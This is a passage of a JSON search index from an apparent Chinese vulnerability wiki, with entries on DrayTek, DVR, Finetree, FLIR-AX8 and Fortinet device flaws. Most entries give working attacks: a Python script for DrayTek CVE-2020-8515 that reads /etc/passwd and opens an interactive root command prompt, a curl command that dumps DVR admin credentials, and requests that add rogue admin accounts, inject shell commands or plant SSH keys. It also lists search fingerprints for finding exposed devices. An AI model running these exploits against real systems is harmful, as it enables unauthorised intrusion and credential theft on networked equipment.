","date":"0001-01-01","objectID":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/:0:0","tags":null,"title":"","uri":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/"},{"categories":null,"content":"漏洞描述 DrayTek URI未能正确处理SHELL字符，远程攻击者可以利用该漏洞提交特殊的请求，可以ROOT权限执行任意命令。 远程命令注入漏洞被标记为CVE-2020-8515，主要影响了DrayTek Vigor网络设备，包括企业交换机、路由器、负载均衡器和VPN网关。 ","date":"0001-01-01","objectID":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/:1:0","tags":null,"title":"","uri":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/"},{"categories":null,"content":"漏洞影响 Vigor2960 \u003c v1.5.1 Vigor300B \u003c v1.5.1 Vigor3900 \u003c v1.5.1 VigorSwitch20P2121 \u003c= v2.3.2 VigorSwitch20G1280 \u003c= v2.3.2 VigorSwitch20P1280 \u003c= v2.3.2 VigorSwitch20G2280 \u003c= v2.3.2 VigorSwitch20P2280 \u003c= v2.3.2 ","date":"0001-01-01","objectID":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/:2:0","tags":null,"title":"","uri":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/"},{"categories":null,"content":"网络测绘 title=\"Vigor 2960\" ","date":"0001-01-01","objectID":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/:3:0","tags":null,"title":"","uri":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/"},{"categories":null,"content":"漏洞复现 登录页面抓包 请求包如下 POST /cgi-bin/mainfunction.cgi HTTP/1.1 Host: xxx.xxx.xxx.xxx Connection: close Content-Length: 67 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Content-Type: text/plain; charset=UTF-8 Accept: */* Sec-Fetch-Site: same-origin Sec-Fetch-Mode: cors Sec-Fetch-Dest: empty Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 action=login\u0026keyPath=%27%0A%2fbin%2fls%0A%27\u0026loginUser=a\u0026loginPwd=a 其中出现注入点的参数为 keyPath 出现空格需要替换，例如 cat /etc/passwd –\u003e cat${IFS}/etc/passwd 可以使用 \u0026 执行额外一条命令 (URL编码为 %26) ","date":"0001-01-01","objectID":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/:4:0","tags":null,"title":"","uri":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: DrayTek企业网络设备 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCmd \u003e\u003e\u003e pwd \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } data = \"action=login\u0026keyPath=%27%0A%2fbin%2fcat${IFS}/etc/passwd%0A%27\u0026loginUser=a\u0026loginPwd=a\" try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) print(\"\\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \\033[0m\".format(target_url)) if \"root\" in response.text and response.status_code == 200: print(\"\\033[32m[o] 目标 {}存在漏洞 ,成功读取 /etc/passwd \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) while True: Cmd = input(\"\\033[35mCmd \u003e\u003e\u003e \\033[0m\") if Cmd == \"exit\": sys.exit(0) else: POC_2(target_url, Cmd) else: print(\"\\033[31m[x] 不存在漏洞 \\033[0m\") sys.exit(0) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) sys.exit(0) def POC_2(target_url, Cmd): vuln_url = target_url + \"/cgi-bin/mainfunction.cgi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } Cmd = Cmd.replace(' ','${IFS}') data = \"action=login\u0026keyPath=%27%0A%2fbin%2f%26{}%0A%27\u0026loginUser=a\u0026loginPwd=a\".format(Cmd) try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, headers=headers, data=data, verify=False, timeout=5) if response.status_code == 200: print(\"\\033[32m[o] 正在请求 {}/cgi-bin/mainfunction.cgi \\033[0m\".format(target_url)) print(\"\\033[32m[o] 响应为:\\n{} \\033[0m\".format(response.text)) except Exception as e: print(\"\\033[31m[x] 请求失败 \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) ","date":"0001-01-01","objectID":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/:5:0","tags":null,"title":"","uri":"/draytek%E4%BC%81%E4%B8%9A%E7%BD%91%E7%BB%9C%E8%AE%BE%E5%A4%87-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-cve-2020-8515/"},{"categories":null,"content":"DVR 登录绕过漏洞 CVE-2018-9995 ","date":"0001-01-01","objectID":"/dvr-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2018-9995/:0:0","tags":null,"title":"","uri":"/dvr-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2018-9995/"},{"categories":null,"content":"漏洞描述 DVR，全称为Digital Video Recorder(硬盘录像机)，即数字视频录像机。最初由阿根廷研究员发现，通过使用“Cookie： uid = admin”的Cookie标头来访问特定DVR的控制面板，DVR将以明文形式响应设备的管理员凭证。 ","date":"0001-01-01","objectID":"/dvr-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2018-9995/:1:0","tags":null,"title":"","uri":"/dvr-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2018-9995/"},{"categories":null,"content":"漏洞影响 Novo CeNova QSee Pulnix XVR 5 in 1 (title: \"XVR Login\") Securus, - Security. Never Compromise !! - Night OWL DVR Login HVR Login MDVR Login ","date":"0001-01-01","objectID":"/dvr-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2018-9995/:2:0","tags":null,"title":"","uri":"/dvr-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2018-9995/"},{"categories":null,"content":"漏洞复现 使用curl命令获得账号密码 curl \"http://xxx.xxx.xxx.xxx/device.rsp?opt=user\u0026cmd=list\" -H \"Cookie: uid=admin\" ","date":"0001-01-01","objectID":"/dvr-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2018-9995/:3:0","tags":null,"title":"","uri":"/dvr-%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E-cve-2018-9995/"},{"categories":null,"content":"Finetree 5MP 摄像机 user_pop.php 任意用户添加漏洞 CNVD-2021-42372 ","date":"0001-01-01","objectID":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/:0:0","tags":null,"title":"","uri":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/"},{"categories":null,"content":"漏洞描述 Finetree 5MP 摄像机 user_pop.php文件存在未授权任意用户添加，攻击者添加后可以获取后台权限 ","date":"0001-01-01","objectID":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/:1:0","tags":null,"title":"","uri":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/"},{"categories":null,"content":"漏洞影响 Finetree 5MP Finetree 3MP ","date":"0001-01-01","objectID":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/:2:0","tags":null,"title":"","uri":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/"},{"categories":null,"content":"网络测绘 app=\"Finetree-5MP-Network-Camera\" ","date":"0001-01-01","objectID":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/:3:0","tags":null,"title":"","uri":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/"},{"categories":null,"content":"漏洞复现 登录页面 存在漏洞的文件 user_pop.php POST /quicksetup/user_update.php HTTP/1.1 Host: Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Content-Length: 58 Content-Type: application/x-www-form-urlencoded Cookie: PHPSESSID=fn4qnpv5c8a2jgvf53vs1gufm6 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36 method=add\u0026user=admin1234\u0026pwd=admin1234\u0026group=2\u0026ptz_enable=0 可以Burpsuite发送POST请求 或者HackBar发送POST请求，返回200即为添加成功，返回804则为用户重复 利用添加的账户可以登录后台 ","date":"0001-01-01","objectID":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/:4:0","tags":null,"title":"","uri":"/finetree-5mp-%E6%91%84%E5%83%8F%E6%9C%BA-user_pop.php-%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E6%B7%BB%E5%8A%A0%E6%BC%8F%E6%B4%9E-cnvd-2021-42372/"},{"categories":null,"content":"FLIR-AX8 download.php 任意文件下载 ","date":"0001-01-01","objectID":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:0:0","tags":null,"title":"","uri":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞描述 FLIR-AX8 download.php文件过滤不全 存在任意文件下载漏洞 ","date":"0001-01-01","objectID":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:1:0","tags":null,"title":"","uri":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞影响 FLIR-AX8 ","date":"0001-01-01","objectID":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:2:0","tags":null,"title":"","uri":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"网络测绘 app=\"FLIR-FLIR-AX8\" ","date":"0001-01-01","objectID":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:3:0","tags":null,"title":"","uri":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件为 download.php \u003c?php /** * Copyright 2012 Armand Niculescu - MediaDivision.com * Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met: * 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer. * 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution. * THIS SOFTWARE IS PROVIDED BY THE FREEBSD PROJECT \"AS IS\" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE FREEBSD PROJECT OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE. */ // get the file request, throw error if nothing supplied // hide notices @ini_set('error_reporting', E_ALL \u0026 ~ E_NOTICE); //- turn off compression on the server //@apache_setenv('no-gzip', 1); //@ini_set('zlib.output_compression', 'Off'); if(!isset($_REQUEST['file']) || empty($_REQUEST['file'])) { header(\"HTTP/1.0 400 Bad Request\"); exit; } // sanitize the file request, keep just the name and extension // also, replaces the file location with a preset one ('./myfiles/' in this example) $file_path = $_REQUEST['file']; $file_type = $_REQUEST['type']; $path_parts = pathinfo($file_path); $file_name = $path_parts['basename']; $file_ext = $path_parts['extension']; // allow a file to be streamed instead of sent as an attachment $is_attachment = isset($_REQUEST['stream']) ? false : true; // make sure the file exists if (is_file($file_path)) { $file_size = filesize($file_path); $file = @fopen($file_path,\"rb\"); if ($file) { // set the headers, prevent caching header(\"Pragma: public\"); header(\"Expires: -1\"); header(\"Cache-Control: public, must-revalidate, post-check=0, pre-check=0\"); header(\"Content-Disposition: attachment; filename=\\\"$file_name\\\"\"); // set appropriate headers for attachment or streamed file if ($is_attachment) { header(\"Content-Disposition: attachment; filename=\\\"$file_name\\\"\"); } else { header('Content-Disposition: inline;'); header('Content-Transfer-Encoding: binary'); } // set the mime type based on extension, add yours if needed. $ctype_default = \"application/octet-stream\"; $content_types = array( \"exe\" =\u003e \"application/octet-stream\", \"zip\" =\u003e \"application/zip\", \"mp3\" =\u003e \"audio/mpeg\", \"mpg\" =\u003e \"video/mpeg\", \"avi\" =\u003e \"video/x-msvideo\", ); $ctype = isset($content_types[$file_ext]) ? $content_types[$file_ext] : $ctype_default; header(\"Content-Type: \" . $ctype); //check if http_range is sent by browser (or download manager) if(isset($_SERVER['HTTP_RANGE'])) { list($size_unit, $range_orig) = explode('=', $_SERVER['HTTP_RANGE'], 2); if ($size_unit == 'bytes') { //multiple ranges could be specified at the same time, but for simplicity only serve the first range //http://tools.ietf.org/id/draft-ietf-http-range-retrieval-00.txt list($range, $extra_ranges) = explode(',', $range_orig, 2); } else { $range = ''; header('HTTP/1.1 416 Requested Range Not Satisfiable'); exit; } } else { $range = ''; } //figure out download piece from range (if set) list($seek_start, $seek_end) = explode('-', $range, 2); ob_clean(); //set start and end based on range (if set), else set defaults //also check for invalid ranges. $seek_end = (empty($seek_end)) ? ($file_size - 1) : min(abs(intval($seek_end)),($file_size - 1)); $seek_start = (empty($seek_start)","date":"0001-01-01","objectID":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/:4:0","tags":null,"title":"","uri":"/flir-ax8-download.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/"},{"categories":null,"content":"FLIR-AX8 res.php 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 FLIR-AX8 res.php 文件存在后台命令执行漏洞，攻击者通过默认口令登录后台后获取服务器权限 ","date":"0001-01-01","objectID":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 FLIR-AX8 ","date":"0001-01-01","objectID":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"FLIR-FLIR-AX8\" ","date":"0001-01-01","objectID":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 出现漏洞的文件为 res.php \u003c?php if (isset($_POST[\"action\"])) { switch ($_POST[\"action\"]) { case \"get\": if(isset($_POST[\"resource\"])) { switch ($_POST[\"resource\"]) { case \".rtp.hflip\": if (!file_exists(\"/FLIR/system/journal.d/horizontal_flip.cfg\")) { $result = \"false\"; break; } $result = file_get_contents(\"/FLIR/system/journal.d/horizontal_flip.cfg\") === \"1\" ? \"true\" : \"false\"; break; case \".rtp.vflip\": if (!file_exists(\"/FLIR/system/journal.d/vertical_flip.cfg\")) { $result = \"false\"; break; } $result = file_get_contents(\"/FLIR/system/journal.d/vertical_flip.cfg\") === \"1\" ? \"true\" : \"false\"; break; default: $result = trim(shell_exec(\"LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -o \".$_POST[\"resource\"])); } } break; case \"set\": if(isset($_POST[\"resource\"]) and isset($_POST[\"value\"])) { switch ($_POST[\"resource\"]) { case \"rtp.hflip\": file_put_contents(\"/FLIR/system/journal.d/horizontal_flip.cfg\", $_POST[\"value\"] === \"true\" ? \"1\" : \"0\"); break; case \"rtp.vflip\": file_put_contents(\"/FLIR/system/journal.d/vertical_flip.cfg\", $_POST[\"value\"] === \"true\" ? \"1\" : \"0\"); break; default: $result = trim(shell_exec(\"LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rset \".$_POST[\"resource\"].\" \".$_POST[\"value\"]));; } } break; case \"measurement\": if (isset($_POST[\"type\"]) \u0026\u0026 isset($_POST[\"id\"])) { $nodeData = trim(shell_exec(\"LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.measureFuncs.\".$_POST[\"type\"].\".\".$_POST[\"id\"])); $lines = explode(\"\\n\", $nodeData); foreach($lines as $line) { $resource = preg_split('/\\s+/', $line); $value = trim($resource[1], \"\\\"\"); $result[$resource[0]] = $value; } } break; case \"global-parameters\": $nodeData = trim(shell_exec(\"LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls -i .image.sysimg.basicImgData.objectParams\")); $lines = explode(\"\\n\", $nodeData); foreach($lines as $line) { $resource = preg_split('/\\s+/', $line); $result[$resource[0]] = $resource[1]; } case \"alarm\": if(isset($_POST[\"id\"])) { $nodeData = trim(shell_exec(\"LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls .image.sysimg.alarms.measfunc.\".$_POST[\"id\"])); $lines = explode(\"\\n\", $nodeData); foreach($lines as $line) { $resource = preg_split('/\\s+/', $line); $value = trim($resource[1], \"\\\"\"); $result[$resource[0]] = $value; } } break; case \"calibrate\": $result = shell_exec(\"LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/nuc\"); break; case \"node\": $nodes = trim(shell_exec(\"LD_LIBRARY_PATH=/FLIR/usr/lib /FLIR/usr/bin/rls \".$_POST[\"resource\"])); $result = preg_split(\"/\\s+\\n/\", $nodes); break; } echo json_encode($result); } ?\u003e 验证POC POST /res.php action=node\u0026resource=;id ","date":"0001-01-01","objectID":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/flir-ax8-res.php-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"Fortinet FortiOS admin 远程命令执行漏洞 CVE-2022-40684 ","date":"0001-01-01","objectID":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/:0:0","tags":null,"title":"","uri":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/"},{"categories":null,"content":"漏洞描述 Fortinet 周一指出，上周修补的 CVE-2022-40684 身份验证绕过安全漏洞，正在野外被广泛利用。作为管理界面上的一个身份验证绕过漏洞，远程威胁参与者可利用其登录 FortiGate 防火墙、FortiProxy Web 代理、以及 FortiSwitch Manager（FSWM）本地管理实例 ","date":"0001-01-01","objectID":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/:1:0","tags":null,"title":"","uri":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/"},{"categories":null,"content":"漏洞影响 FortiOS \u003c= 7.2.1、7.2.0、7.0.6、7.0.5、7.0.4、7.0.3、7.0.2、7.0.1、7.0.0 FortiProxy \u003c= 7.2.0、7.0.6、7.0.5、7.0.4、7.0.3、7.0.2、7.0.1、7.0.0 FortiSwitchManager \u003c= 7.2.0、7.0.0 ","date":"0001-01-01","objectID":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/:2:0","tags":null,"title":"","uri":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/"},{"categories":null,"content":"网络测绘 title=\"FortiProxy\" ","date":"0001-01-01","objectID":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/:3:0","tags":null,"title":"","uri":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC, 利用时更换 admin用户名及 ssh-public-key1中的 ssh key 添加远程 SSH登录凭证 PUT /api/v2/cmdb/system/admin/admin HTTP/1.1 Host: Accept: */* Accept-Encoding: gzip, deflate Content-Length: 597 Content-Type: application/json Forwarded: for=\"[127.0.0.1]:8888\";by=\"[127.0.0.1]:8888\" User-Agent: Report Runner {\"ssh-public-key1\": \"123\"} ","date":"0001-01-01","objectID":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/:4:0","tags":null,"title":"","uri":"/fortinet-fortios-admin-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E-cve-2022-40684/"},{"categories":null,"content":"H3C SecPath下一代防火墙 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 H3C SecPath 下一代防火墙 存在功能点导致任意文件下载漏洞，攻击者通过漏洞可以获取敏感信息 ","date":"0001-01-01","objectID":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/h3c-secpath%E4%B8%8B%E4%B8%80%E4%BB%A3%E9%98%B2%E7%81%AB%E5%A2%99-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 H3C SecPath 